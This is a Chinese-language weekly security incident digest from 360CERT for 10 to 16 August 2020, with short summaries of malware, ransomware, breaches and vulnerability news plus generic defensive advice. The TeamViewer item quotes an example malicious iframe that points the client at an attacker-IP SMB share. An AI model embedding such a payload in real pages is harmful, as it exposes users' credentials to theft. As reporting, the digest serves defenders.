---
id: ceaf944e43fda4ac390c046d6b9c1fba
title: 安全事件周报 (8.10-8.16)
tags: 
  - 安全资讯
  - 360CERT
---

# 安全事件周报 (8.10-8.16)

0x01 事件导览
---------


本周收录安全事件`26`项，话题集中在`勒索`、`网络攻击`方面，涉及的厂商有：`Google`、`Amazon`、`TeamViewer`、`Microsoft`等。恶意程序层出不穷，疫情肆虐下，卫生行业屡受攻击。对此，360CERT建议使用`360安全卫士`进行病毒检测、使用`360安全分析响应平台`进行威胁流量检测，使用`360城市级网络安全监测服务QUAKE`进行资产测绘，做好资产自查以及预防工作，以免遭受黑客攻击。




| **恶意程序** | 等级 |
| --- | --- |
| Agent Tesla恶意软件从浏览器、vpn窃取密码 | ★★★★ |
| Nefilim勒索软件称已入侵SPIE组 | ★★★★ |
| XCSSET Mac恶意软件 | ★★★★ |
| Mekotio银行木马模仿更新警报来窃取比特币 | ★★★★ |
| Avaddon勒索软件发布数据泄露网站用以敲诈 | ★★★ |
| 科罗拉多市被迫支付4.5万美元赎金以解密文件 | ★★★ |
| FBI和NSA揭露了恶意软件Drovorub | ★★★ |
| **数据安全** |  |
| 网络钓鱼攻击使SANS infosec培训机构数据泄露 | ★★★★ |
| 黑客泄露美国枪支交易网站数据 | ★★★★ |
| 密歇根州立大学披露信用卡盗窃事件 | ★★★ |
| 伊利诺斯州医疗系统数据泄露 | ★★★ |
| Sodinokibi勒索软件团伙从Brown-Forman窃取了1TB的数据 | ★★★ |
| NCC集团承认数据泄露 | ★★ |
| **黑客攻击** |  |
| Chrome浏览器漏洞导致数十亿用户数据被盗 | ★★★★★ |
| 神秘组织劫持Tor出口节点以执行SSL剥离攻击 | ★★★ |
| Re­VoL­TE攻击能解密4G（LTE）通话从而窃听 | ★★★ |
| 英国国家医疗服务系统(NHS)收到诈骗邮件 | ★★★ |
| 商业科技巨头柯尼卡美能达(Konica Minolta)遭勒索软件攻击 | ★★★ |
| 加拿大遭受网络攻击，被用来窃取COVID-19救助款项 | ★★★ |
| RedCurl黑客隐蔽窃取公司文档 | ★★ |
| **其它事件** |  |
| TeamViewer漏洞能够破解密码 | ★★★★★ |
| 安全研究员发布vBulletin 0day漏洞的详情和利用代码 | ★★★★ |
| 微软8月的补丁修复多个高危漏洞 | ★★★★ |
| 医疗保健数据泄露事件 | ★★★ |
| 过期证书使COVID-19结果计数不足 | ★★★ |
| 亚马逊Alexa一键攻击能泄露个人数据 | ★★★ |


0x02 恶意程序
---------


### Agent Tesla恶意软件从浏览器、vpn窃取密码



```
日期: 2020年8月10日
等级: 高
作者: Sergiu Gatlan
标签: Malware, Agent Tesla, Keylogger, Remote Access Trojan, Info Stealer

```
新的`AgentTesla`木马变种现在带有专门的模块，从应用程序窃取证书，包括流行的网络浏览器，VPN软件，以及FTP和电子邮件客户端。`AgentTesla`是一种基于.Net的商业信息窃取程序，至少从2014年开始就具有远程访问特洛伊木马（RAT）和激活的键盘记录功能。该恶意软件目前在商业电子邮件泄露（BEC）诈骗者中非常流行，这些诈骗者使用它来感染受害者，以记录击键并捕获受感染机器的屏幕快照。它也可以用于窃取受害者剪贴板内容的数据，收集系统信息以及杀死反恶意软件和软件分析过程。


**详情**


Upgraded Agent Tesla malware steals passwords from browsers, VPNs


<https://www.bleepingcomputer.com/news/security/upgraded-agent-tesla-malware-steals-passwords-from-browsers-vpns/>


### Nefilim勒索软件称已入侵SPIE组



```
日期: 2020年8月10日
等级: 高
作者: Pierluigi Paganini
标签: Malware, Nefilim, Ransomware, Data Leak, Spie

```
威胁情报公司Cyble的研究人员报告称，Nefilim勒索软件运营商涉嫌侵入了欧洲多元化技术服务的独立领导者SPIE集团。勒索软件攻击的数量继续增加，黑客还窃取了受害者的数据，并威胁他们如果不支付赎金就释放被盗的信息。在对darkweb和deepweb进行监控期间，Cyble研究团队发现了一篇来自Nefilim勒索软件运营商的帖子，他们在帖子中声称已经攻破了SPIE集团。


**详情**


Nefilim ransomware operators claim to have hacked the SPIE group


<https://securityaffairs.co/wordpress/106969/malware/nefilim-ransomware-spie-group.html>


### XCSSET Mac恶意软件



```
日期: 2020年8月13日
等级: 高
作者: Trend Micro
标签: Malware, Mac, XCSSET, Xcode, UXSS, Backdoor

```
国外安全厂商发现开发人员的Xcode项目包含源恶意软件，从而导致恶意payload的漏洞。其中，最值得注意的是两个`0day`漏洞：一个漏洞是通过`DataVaults`行为的缺陷来窃取`Cookie`，另一个漏洞是滥用`Safari`的开发版本。这种情况很不寻常。在这种情况下，会将恶意代码注入本地`Xcode`项目，以便在构建项目时运行恶意代码。这尤其对`Xcode`开发人员构成了风险。由于已经确定受影响的开发人员在`GitHub`上共享了他们的项目，因此威胁不断升级，这对那些依赖于这些存储库的用户造成了类似供应链的攻击。同时，还在`VirusTotal`等来源中发现了这种威胁，这表明这一威胁是普遍存在的。


**详情**


XCSSET Mac Malware: Infects Xcode Projects, Performs UXSS Attack on Safari, Other Browsers, Leverages Zero-day Exploits


<https://blog.trendmicro.com/trendlabs-security-intelligence/xcsset-mac-malware-infects-xcode-projects-performs-uxss-attack-on-safari-other-browsers-leverages-zero-day-exploits/>


### Mekotio银行木马模仿更新警报来窃取比特币



```
日期: 2020年8月13日
等级: 高
作者: Ax Sharma
标签: Malware, Mekotio, Banking Trojan, Bitcoin, Phishing

```
一种针对拉丁美洲用户的多功能银行木马已经在多个国家传播，包括墨西哥、巴西、智利、西班牙、秘鲁和葡萄牙。该恶意软件确保了被感染系统的持久性，并具有植入后门、窃取比特币和泄露证书等高级功能。该木马被称为`Mekotio`，它从受害者主机收集敏感信息，例如防火墙配置，操作系统信息，是否启用了管理员特权以及已安装的任何防病毒产品的状态。


**详情**


Mekotio banking trojan imitates update alerts to steal Bitcoin


<https://www.bleepingcomputer.com/news/security/mekotio-banking-trojan-imitates-update-alerts-to-steal-bitcoin/>


### Avaddon勒索软件发布数据泄露网站用以敲诈



```
日期: 2020年8月10日
等级: 中
作者: Lawrence Abrams
标签: Malware, Avaddon, Ransomware, Data Leak, Data Exfiltration

```
`Avaddon`勒索软件(`Avaddonransomware`)是最新的网络犯罪行动，它推出了一个数据泄露网站，用于公布未支付赎金要求的受害者的被盗数据。自从迷宫运营商开始公开泄露在勒索软件攻击中被盗的文件后，其他运营商很快也效仿，开始创建数据泄露网站来发布被盗文件。这些网站的目的是恐吓受害者，让他们在文件泄露给公众的威胁下支付勒索软件。如果这些数据被公开，可能会暴露财务信息、员工个人信息和客户数据，从而导致数据泄露。


**详情**


Avaddon ransomware launches data leak site to extort victims


<https://www.bleepingcomputer.com/news/security/avaddon-ransomware-launches-data-leak-site-to-extort-victims/>


### 科罗拉多市被迫支付4.5万美元赎金以解密文件



```
日期: 2020年8月11日
等级: 中
作者: Lawrence Abrams
标签: Malware, Ransomware, Colorado, Lafayette City, Encrypted

```
美国科罗拉多州的一座城市被迫支付4.5万美元，原因是该市的设备在7月份被加密，无法从备份中恢复必要的文件。2020年7月27日，拉斐特市遭遇勒索软件攻击，影响了他们的电话服务、电子邮件和在线支付预订系统。当时，纽约市尚未解释造成停电的原因，但表示居民应使用911或其他号码进行紧急服务。一周多后，市政府宣布，他们受到了勒索软件的攻击，该攻击对他们的设备和数据进行了加密，并摧毁了他们的系统。


**详情**


Colorado city forced to pay $45,000 ransom to decrypt files


<https://www.bleepingcomputer.com/news/security/colorado-city-forced-to-pay-45-000-ransom-to-decrypt-files/>


### FBI和NSA揭露了恶意软件Drovorub



```
日期: 2020年8月13日
等级: 中
作者: Catalin Cimpanu
标签: Malware, Linux, Drovorub, Rootkit, FBI, NAS

```
FBI和NSA在2020年8月13日发布了联合安全警报，其中包含有关两种新型`Linux`恶意软件的详细信息，两家机构称这是由俄罗斯军方黑客在现实世界的攻击中开发和部署的。两家机构表示，俄罗斯黑客使用名为`Drovorub`的恶意软件，在被黑客入侵的网络中植入后门程序。为了防止攻击，该机构建议美国机构将任何`Linux`系统升级到运行内核版本3.7或更高的版本，“以充分利用内核签名执行，”这一安全特性将阻止`APT28`黑客安装`Drovorub`的`rootkit`。


**详情**


FBI and NSA expose new Linux malware Drovorub, used by Russian state hackers


<https://www.zdnet.com/article/fbi-and-nsa-expose-new-linux-malware-drovorub-used-by-russian-state-hackers/>


### **相关安全建议**


1. 不轻信网络消息，不浏览不良网站、不随意打开邮件附件，不随意运行可执行程序
2. 勒索中招后，应及时断网，并第一时间联系安全部门或公司进行应急处理
3. 及时对系统及各个服务组件进行版本升级和补丁更新
4. 网段之间进行隔离，避免造成大规模感染
5. 在网络边界部署安全设备，如防火墙、IDS、邮件网关等
6. 主机集成化管理，出现威胁及时断网


0x03 数据安全
---------


### 网络钓鱼攻击使SANS infosec培训机构数据泄露



```
日期: 2020年8月11日
等级: 高
作者: Lawrence Abrams
标签: Data Breach, Email, SANS, Phishing, Personal Information

```
网络安全培训组织SANS的一名员工受到网络钓鱼攻击，导致其数据泄露。SANS学院是向全球用户提供信息安全培训和安全认证的最大组织之一。在8月11号发布在他们网站上的一份通知中，SANS表示，他们的一名员工受到了网络钓鱼攻击，导致威胁者进入了他们的电子邮件帐户。这些信息不包括密码或信用卡等财务信息，但包括电子邮件地址、全名、电话号码、工作名称、公司名称和实际地址。


**详情**


SANS infosec training org suffers data breach after phishing attack


<https://www.bleepingcomputer.com/news/security/sans-infosec-training-org-suffers-data-breach-after-phishing-attack/>


### 黑客泄露美国枪支交易网站数据



```
日期: 2020年8月13日
等级: 高
作者: Lawrence Abrams
标签: Data Breach, Gun, Hacker Forum, Data Leaked

```
一名黑客在一个网络犯罪论坛上免费发布了犹他州的枪支交易、狩猎和kratom网站的数据库。2020年8月10日，一名威胁者公布了数据库，声称其中包含`utahgunexchange.com`的19.5万用户记录，他们的视频网站的4.5万记录，`muleyfreak.com`的1.5万记录，以及Kratom网站`deepjunglekratom.com`的2.4万用户记录。所有这些站点都位于美国犹他州以外，网络安全情报公司Cyble共享的数据库示例显示，每个数据库都托管在同一AmazonAWS服务器上每个数据库中用户记录的最新日期为7月16日，这也是数据被盗的时间。


**详情**


Hacker leaks data for U.S. gun exchange site on cybercrime forum


<https://www.bleepingcomputer.com/news/security/hacker-leaks-data-for-us-gun-exchange-site-on-cybercrime-forum/>


### 密歇根州立大学披露信用卡盗窃事件



```
日期: 2020年8月10日
等级: 中
作者: Sergiu Gatlan
标签: Data Breach, Credit Card, Michigan State University, Injection, Skimming Attacks

```
密歇根州立大学（MSU）2020年8月10日披露，攻击者能够从其`shop.msu.edu`在线商店的大约2,600位用户中窃取信用卡和个人信息。攻击者能够注入恶意脚本，利用目前已解决的网站漏洞，侵入并获取客户的支付卡。这样的攻击被称为`webskimming`攻击(也被称为`Magecart`或`e-skimming`)，通常是攻击者能够通过破坏管理帐户在电子商务网站部署卡片`skimmer`脚本的结果。


**详情**


Michigan State University discloses credit card theft incident


<https://www.bleepingcomputer.com/news/security/michigan-state-university-discloses-credit-card-theft-incident/>


### 伊利诺斯州医疗系统数据泄露



```
日期: 2020年8月12日
等级: 中
作者: Jessica Haworth
标签: Data Breach, FHN, Phishing, Cyber-attacks, Illinois Healthcare, Leaked

```
伊利诺斯州医疗机构FHN的数据泄露导致了患者的个人信息被泄露。该事件被FHN描述为电子邮件泄露事件，可能泄露了个人身份信息(PII)，包括姓名、出生日期、社会安全号码和健康保险信息。FHN在一份声明中说，在2020年2月12日和13日，一个未经授权的人进入了员工的电子邮件账户。出于慎重考虑，FHN召集了一个网络安全小组，检查了邮件账户中的电子邮件和附件，以确定患者信息可能被未经授权的人获取。


**详情**


Medical records exposed in data breach at Illinois healthcare system


<https://portswigger.net/daily-swig/medical-records-exposed-in-data-breach-at-illinois-healthcare-system>


### Sodinokibi勒索软件团伙从Brown-Forman窃取了1TB的数据



```
日期: 2020年8月16日
等级: 中
作者: Pierluigi Paganini
标签: Data Breach, Sodinokibi, Brown-Forman, Attack, Leaked

```
Sodinokibi（REvil）勒索软件运营商前段时间宣布，它已经破坏了Brown-Forman的网络，该公司是美国烈酒和葡萄酒行业最大的公司之一。威胁行为者声称窃取了1TB的机密数据，并计划将其中最敏感的信息进行拍卖，并泄露其余信息。该团伙访问的数据包括机密员工的信息，公司协议，合同，财务报表和内部消息。


**详情**


Sodinokibi ransomware gang stole 1TB of data from Brown-Forman


<https://securityaffairs.co/wordpress/107190/data-breach/sodinokibi-ransomware-brown-forman.html>


### NCC集团承认数据泄露



```
日期: 2020年8月11日
等级: 低
作者: Gareth Corfield
标签: Data Breach, NCC, GitHub, Leaked

```
英国独家信息安全公司NCCGroup已向TheRegister承认，其内部培训资料已在GitHub上泄露-在一些资料库中出现了旨在帮助人们通过CREST渗透测试认证考试的文件夹。这些文件是由2020年7月建立的一个帐户发布到多云代码库中的，这些文件保存在标有“备忘单”的文件夹中。它们似乎是一套过于直白并且信息丰富的培训材料。尽管知道一些分支副本可能仍然存在，但这些有问题的存储库现在已经从GitHub中移除。


**详情**


NCC Group admits its training data was leaked online after folders full of CREST pentest certification exam notes posted to GitHub


<https://www.theregister.com/2020/08/11/ncc_group_crest_cheat_sheets/>


### **相关安全建议**


1. 及时备份数据并确保数据安全
2. 合理设置服务器端各种文件的访问权限
3. 明确每个服务功能的角色访问权限
4. 严格控制数据访问权限
5. 及时检查并删除外泄敏感数据
6. 发生数据泄漏事件后，及时进行密码更改等相关安全措施


0x04 黑客攻击
---------


### Chrome浏览器漏洞导致数十亿用户数据被盗



```
日期: 2020年8月10日
等级: 高
作者: Tara Seals
标签: Attack, Google, Chrome, Chromium, CVE-2020-6519, CSP, XSS

```
`Google`的基于`Chromium`的浏览器中的漏洞可能使攻击者绕过网站上的内容安全政策（CSP），窃取数据并执行恶意代码。据`PerimeterX`网络安全研究员`GalWeizman`称，该漏洞（`CVE-2020-6519`）可在`Windows`，`Mac`和`Android`的`Chrome`，`Opera`和`Edge`中找到，可能影响数十亿网络用户。`Chrome`版本73（2019年3月）到83版本（84已在7月发布并修复了该问题）受到影响。CSP是一种网络标准，旨在阻止某些类型的攻击，包括跨站点脚本（XSS）和数据注入攻击。CSP允许Web管理员指定浏览器应将其视为可执行脚本的有效源的域。然后，与CSP兼容的浏览器将仅执行从这些域接收的源文件中加载的脚本。


**详情**


Google Chrome Browser Bug Exposes Billions of Users to Data Theft


<https://threatpost.com/google-chrome-bug-data-theft/158217/>


### 神秘组织劫持Tor出口节点以执行SSL剥离攻击



```
日期: 2020年8月10日
等级: 中
作者: Catalin Cimpanu
标签: Attack, Tor Browser, SSL, SSL Stripping Attacks, Hijacked

```
自2020年1月以来，一个神秘的威胁行动者一直在向Tor网络中添加服务器，以便对用户进行`SSL剥离攻击`，这些用户通过Tor浏览器访问与加密货币相关站点。该组织的攻击如此庞大和持久，以至于2020年5月，他们运行了所有Tor出口中继的四分之一-用户流量通过这些服务器离开Tor网络并访问公共互联网。根据独立安全研究人员和`Tor`服务器运营商`Nusenu`2020年8月2日发布的一份报告称，在`Tor`团队采取三项干预措施中的第一项来干预该网络之前，该小组在高峰期管理了380个恶意Tor出口中继站。


**详情**


A mysterious group has hijacked Tor exit nodes to perform SSL stripping attacks


<https://www.zdnet.com/article/a-mysterious-group-has-hijacked-tor-exit-nodes-to-perform-ssl-stripping-attacks/>


### Re­VoL­TE攻击能解密4G（LTE）通话从而窃听



```
日期: 2020年8月12日
等级: 中
作者: Catalin Cimpanu
标签: Attack, Re­VoL­TE, 4G, VoLTE, GSMA, Encrypted

```
一组学者于2020年8月详细介绍了LTE语音（`VoLTE`）协议​​中的漏洞，该漏洞可用于破坏4G语音呼叫的加密。研究人员称，这种名为`ReVoLTE`的攻击之所以有可能发生，是因为移动运营商经常使用相同的加密密钥，来保护通过同一个基站(移动信号塔)进行的多个4G语音通话。学者们说，他们在真实场景中测试了这次攻击，发现多个移动运营商都受到了影响，他们已经与管理电话标准的GSM协会(GSMA)合作，以解决这个问题。


**详情**


Re­VoL­TE attack can decrypt 4G (LTE) calls to eavesdrop on conversations


<https://www.zdnet.com/article/re-vol-te-attack-can-decrypt-4g-lte-calls-to-eavesdrop-on-conversations/>


### 英国国家医疗服务系统(NHS)收到诈骗邮件



```
日期: 2020年8月12日
等级: 中
作者: Owen Hughes
标签: Attack, COVID-19, Phishing, Spam, Email Attacks, NHS

```
在COVID-19疫情最严重的时候，NHS的工作人员受到了一波恶意电子邮件攻击，医生、护士和其他关键工作人员报告说，从3月到7月上半月，共有4万多起垃圾邮件和钓鱼攻击。英国智库“议会街”(ParliamentStreet)通过信息自由请求获得的NHSDigital数据显示，仅在3月份，NHS工作人员就报告了21188封恶意邮件。4月，员工报告了8085封电子邮件，其中5月5883封，6月6468封，7月上半月1484封。


**详情**


NHS hit with wave of scam emails at height of COVID-19 pandemic


<https://www.zdnet.com/article/nhs-staff-hit-with-over-40000-scam-emails-at-height-of-covid-19-pandemic/>


### 商业科技巨头柯尼卡美能达(Konica Minolta)遭勒索软件攻击



```
日期: 2020年8月16日
等级: 中
作者: Lawrence Abrams
标签: Attack, RansomEXX, Ransomware, Konica Minolta

```
`BleepingComputer`了解到商业技术巨头柯尼卡美能达（`KonicaMinolta`）于7月底遭到勒索软件攻击，影响了服务近一个星期。柯尼卡美能达（KonicaMinolta）是日本跨国商业技术巨头，拥有近44,000名员工，2019年的收入超过90亿美元。该公司提供广泛的服务和产品，从打印解决方案、医疗保健技术到为企业提供管理IT服务。


**详情**


Business technology giant Konica Minolta hit by new ransomware


<https://www.bleepingcomputer.com/news/security/business-technology-giant-konica-minolta-hit-by-new-ransomware/>


### 加拿大遭受网络攻击，被用来窃取COVID-19救助款项



```
日期: 2020年8月16日
等级: 中
作者: Ax Sharma
标签: Attack, Canada, COVID-19, GCKey, Relief Payments

```
在一场盗取`COVID-19`救济款项的协同攻击中，一个加拿大政府提供移民、税收、养老金和福利等关键服务的网站遭到破坏。被称为GCKey的在线门户是一个重要的单点登录(SSO)系统，公众可以使用它来访问多个加拿大政府服务。攻击者使用“凭据填充”技术成功进入了1,200万个总计的9,041个GCKey帐户。


**详情**


Canada suffers cyberattack used to steal COVID-19 relief payments


<https://www.bleepingcomputer.com/news/security/canada-suffers-cyberattack-used-to-steal-covid-19-relief-payments/>


### RedCurl黑客隐蔽窃取公司文档



```
日期: 2020年8月13日
等级: 低
作者: Ionut Ilascu
标签: Attack, RedCurl, Phishing, LNK, XLAM, Group-IB

```
在过去的几年里，一个鲜为人知的网络间谍组织一直在对广泛地区的受害者进行精心策划的攻击，以窃取机密的公司文件。在很短的时间内，机组人员对14个组织发动了至少26次袭击，但一直都十分低调。只要通过使用定制工具，和使用类似红队活动测试组织对网络攻击的防御能力的战术，保持隐蔽是可能的。


**详情**


Stealthy RedCurl hackers steal corporate documents


<https://www.bleepingcomputer.com/news/security/stealthy-redcurl-hackers-steal-corporate-documents/>


### **相关安全建议**


1. 包括浏览器、邮件客户端、vpn、远程桌面等在内的个人应用程序，应及时更新到最新版本
2. 使用VPN等代理服务时，应当谨慎选择代理服务供应商，避免个人敏感信息泄漏
3. 在网络边界部署安全设备，如防火墙、IDS、邮件网关等
4. 做好资产收集整理工作，关闭不必要且有风险的外网端口和服务，及时发现外网问题
5. 积极开展外网渗透测试工作，提前发现系统问题
6. 减少外网资源和不相关的业务，降低被攻击的风险
7. 域名解析使用CDN
8. 及时对系统及各个服务组件进行版本升级和补丁更新
9. 注重内部员工安全培训


0x05 其它事件
---------


### TeamViewer漏洞能够破解密码



```
日期: 2020年8月10日
等级: 高
作者: Lindsey O'Donnell
标签: TeamViewer, CVE-2020-13699, URI, Windows, Iframe, Attack

```
流行的远程支持软件`TeamViewer`已在其`Windows`桌面应用程序中修复了一个严重级别的漏洞。如果被利用，则该漏洞可能允许未经身份验证的远程攻击者，在用户的系统上执行代码或破解其`TeamViewer`密码。`TeamViewer`是企业使用的专有软件应用程序，用于远程控制功能，桌面共享，在线会议，Web会议和计算机之间的文件传输。最近发现的缺陷源于`Windows`桌面应用程序（`CVE-2020-13699`），没有正确引用其自定义统一资源标识符（`URI`）处理程序。“攻击者可以使用精心制作的URL（`<iframesrc='teamviewer10：–play\\attacker-IP\share\fake.tvs'>`）将恶意`iframe`嵌入网站中，从而启动`TeamViewerWindows`桌面客户端并强制执行此操作。


目前`TeamViewer`在全球均有分布，具体分布如下图，数据来自于`360 QUAKE`


![](https://p403.ssl.qhimgs4.com/t01fdc923f84dd18600.jpeg)


**详情**


TeamViewer Flaw in Windows App Allows Password-Cracking


<https://threatpost.com/teamviewer-fhigh-severity-flaw-windows-app/158204/>


### 安全研究员发布vBulletin 0day漏洞的详情和利用代码



```
日期: 2020年8月10日
等级: 高
作者: Catalin Cimpanu
标签: vBulletin, CVE-2019-16759, Remote Code Execution, Forums

```
安全研究人员已发布了`vBulletin`（当今最受欢迎的论坛软件之一）中的0day漏洞的详细信息和概念验证漏洞的利用代码。该0day漏洞是对先前`vBulletin`的漏洞（即CVE-2019-16759）的补丁的绕过，该漏洞于2019年9月披露。以前的0day漏洞允许攻击者利用`vBulletin`模板系统中的错误来运行恶意代码，进而接管论坛，而无需在受害站点上进行身份验证（一种称为`pre-authRCE`的漏洞）。`CVE-2019-16759`于2019年9月24日公布，并于9月25日提供了补丁。


目前`vBulletin`在全球均有分布，具体分布如下图，数据来自于`360 QUAKE`


![](https://p403.ssl.qhimgs4.com/t0131c63a5d52172f2b.png)


**详情**


Security researcher publishes details and exploit code for a vBulletin zero-day


<https://www.zdnet.com/article/security-researcher-publishes-details-and-exploit-code-for-a-vbulletin-zero-day/>


### 微软8月的补丁修复多个高危漏洞



```
日期: 2020年8月12日
等级: 高
作者: Pierluigi Paganini
标签: Microsoft, Windows, Spoofing, Remote Code Execution, Internet Explorer, CVE-2020-1380, CVE-2020-1464

```
Microsoft2020年8月补丁程序星期二的更新解决了120个漏洞，其中包括两个在野外攻击中利用的0day漏洞。这两个漏洞是Windows欺骗漏洞和InternetExplorer中的远程代码执行漏洞。Windows欺骗漏洞，漏洞编号为：CVE-2020-1464，可以被攻击者利用来绕过安全特性和加载不正确签名的文件。该漏洞与Windows不正确验证文件签名有关。


**详情**


Microsoft August 2020 Patch Tuesday fixed actively exploited zero-days


<https://securityaffairs.co/wordpress/107034/breaking-news/microsoft-august-2020-patch-tuesday.html>


### 医疗保健数据泄露事件



```
日期: 2020年8月10日
等级: 中
作者: Adam Bannister
标签: Black Hat, Healthcare, Data Breach, Iot, HIPAA

```
2020年8月参加美国黑帽2020大会的与会者得知，不安全的技术使得医疗保健机构很容易成为网络罪犯的猎物。在2020年8月的一场虚拟简报中，宾夕法尼亚州医院运营商佩恩医学(`PennMedicine`)的信息安全主管赛斯•福吉(`SethFogie`)模拟了一次多阶段的虚拟数据泄露，共导致约22.5万份记录被泄露。他跟踪了攻击者跨越多个集成系统的行动，涉及到放射学、EMR停机、药品分发、护士呼叫和温度监控。领导宾夕法尼亚大学安全项目十多年的`Fogie`，就加强医疗保健应用程序的安全性提出了建议，并揭露了供应商在安全设计关键系统或及时或恰当地修补漏洞方面的普遍失误。


**详情**


Anatomy of a healthcare data breach dissected at Black Hat 2020


<https://portswigger.net/daily-swig/anatomy-of-a-healthcare-data-breach-dissected-at-black-hat-2020>


### 过期证书使COVID-19结果计数不足



```
日期: 2020年8月13日
等级: 中
作者: Lawrence Abrams
标签: COVID-19, Expired Certificate, CalREDIE, California, TLS

```
由于无法将2.5万到30万份实验室检测结果上传到加州的CalREDIE报告系统，过期的证书和中断导致加州报告的COVID-19病例数被低估。CalREDIE是加州创建的一个数据系统，用于报告和监测传染病病例。使用这个系统，加州可以更容易地发现爆发和事件的社区传播，因为它推进计划开办学校。7月25日，由于数据中断，CalREDIE系统无法接受来自外部合作伙伴的实验结果。有临时修复，但却没有正确移除，这就导致了进一步的问题。


**详情**


Expired certificate led to an undercount of COVID-19 results


<https://www.bleepingcomputer.com/news/technology/expired-certificate-led-to-an-undercount-of-covid-19-results/>


### 亚马逊Alexa一键攻击能泄露个人数据



```
日期: 2020年8月13日
等级: 中
作者: Lindsey O'Donnell
标签: Amazon, Alexa, Vulnerabilities, XSS, CORS, IoT

```
研究人员披露，亚马逊Alexa存在漏洞，能让攻击者获得个人数据，并在Echo设备上安装技能。亚马逊(Amazon)`Alexa`虚拟助手平台的漏洞让攻击者只需诱导用户点击一个恶意链接，就能访问用户的银行数据历史或家庭地址。`CheckPoint`的研究人员在`AmazonAlexa`子域名上发现了几个web应用程序缺陷，包括跨站点脚本(`XSS`)缺陷和跨源资源共享(`CORS`)错误配置。攻击者可以通过向受害者发送一个特制的`Amazon`链接来远程利用这些漏洞。


**详情**


Amazon Alexa ‘One-Click’ Attack Can Divulge Personal Data


<https://threatpost.com/amazon-alexa-one-click-attack-can-divulge-personal-data/158297/>


### **相关安全建议**


1. 及时对系统及各个服务组件进行版本升级和补丁更新
2. 包括浏览器、邮件客户端、vpn、远程桌面等在内的个人应用程序，应及时更新到最新版本
3. 严格控制数据访问权限
4. 注重内部员工安全培训


